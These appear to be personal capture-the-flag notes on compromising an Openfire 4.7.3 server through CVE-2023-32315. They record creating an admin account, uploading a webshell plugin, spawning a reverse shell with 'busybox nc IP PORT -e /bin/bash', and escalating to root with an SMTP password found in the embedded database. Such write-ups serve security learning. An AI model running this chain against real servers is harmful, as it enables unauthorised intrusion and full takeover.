ports 22, 9090, 9091 open
9090 is hadoop, openfire openfire 2.7.3
9091 is a ssl proxy for the same

searchsploit doesnt show anything
googled for it, and there was an entry in CVEdetails, for dir traversal, with CVE-2023-32315
https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT

cloned, and ran the exploit.py, it created account hugme:HugmeNOW

Once we login with those creds, looking around, we finally find we can upload a .jar file for themes

Struggled a bunch
Then, HINT TAKEN : the git https://github.com/miko550/CVE-2023-32315 has porper instructions for openfire exploit, and has a jar to upload
1. Run exploit
2. login with newly added user
3. goto tab plugin > upload plugin `openfire-management-tool-plugin.jar`
4. goto tab server > server settings > Management tool
5. Access websehll with password "123"
there, switch to "System commands"
running dir -- shows a linux file system
normal nc doesnt give a shell, but busybox nc does
`busybox nc IP PORT -e /bin/bash`
busybox!

---
no normal methods
Nothing on pspy, linpeas
linpeas pointed us to an /etc/openfire and /var/lib/openfire
nothing helpful in /etc/openfire
in /var/lib/openfire/embedded-db, we find a openfire.script file where we find
```
109-INSERT INTO OFPROPERTY VALUES('mail.smtp.host','localhost',0,NULL)
110:INSERT INTO OFPROPERTY VALUES('mail.smtp.password','OpenFireAtEveryone',0,NULL)
<snip>
113-INSERT INTO OFPROPERTY VALUES('mail.smtp.username','root',0,NULL)
114:INSERT INTO OFPROPERTY VALUES('passwordKey','EOAJUe2Sqdlfqjk',0,NULL)
```
we try `ssh root@localhost` EOA password, doesnt work
the OpenFireAtEveryone Works!